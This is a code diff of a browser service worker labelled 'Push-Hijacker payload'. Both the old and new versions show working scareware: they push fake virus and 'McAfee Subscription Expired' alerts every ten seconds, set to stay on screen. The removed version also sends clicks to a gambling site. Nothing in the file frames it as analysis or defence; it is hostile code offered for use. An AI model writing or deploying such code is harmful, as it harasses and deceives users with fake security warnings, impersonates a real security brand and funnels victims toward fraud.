@@ -1,30 +1,21 @@
-// sw.js — Push-Hijacker payload
-const TITLE = "⚠️ WARNING: 5 Viruses Found!";
-const BODY  = "Click here to clean your PC immediately!";
-const ICON  = "https://picsum.photos/id/237/128/128";
+const notifications = [
+    { title: "⚠️ WARNING: 5 Viruses Found!", body: "Click to clean your PC immediately!" },
+    { title: "McAfee Subscription Expired", body: "Your protection has ended. Renew now!" },
+    { title: "🚨 Critical Security Alert", body: "Trojan detected. Action required!" }
+];
 
 self.addEventListener('install', () => self.skipWaiting());
 self.addEventListener('activate', event => {
     event.waitUntil(self.clients.claim());
-    
-    console.log('🦠 Push-Hijacker SW activated — starting spam');
-
-    // Спам каждые 10 секунд
+    let i = 0;
     setInterval(() => {
-        self.registration.showNotification(TITLE, {
-            body: BODY,
-            icon: ICON,
-            badge: ICON,
-            vibrate: [500, 100, 500, 100, 500],
-            requireInteraction: true,   // не исчезает сам
-            tag: 'virus-' + Date.now()
+        const n = notifications[i % notifications.length];
+        self.registration.showNotification(n.title, {
+            body: n.body,
+            icon: 'https://picsum.photos/id/237/128/128',
+            requireInteraction: true,
+            vibrate: [400, 100, 400]
         });
+        i++;
     }, 10000);
 });
-
-// Клик по уведомлению
-self.addEventListener('notificationclick', event => {
-    event.notification.close();
-    event.waitUntil(clients.openWindow('https://1win.fyi/ru/'));
-});
-
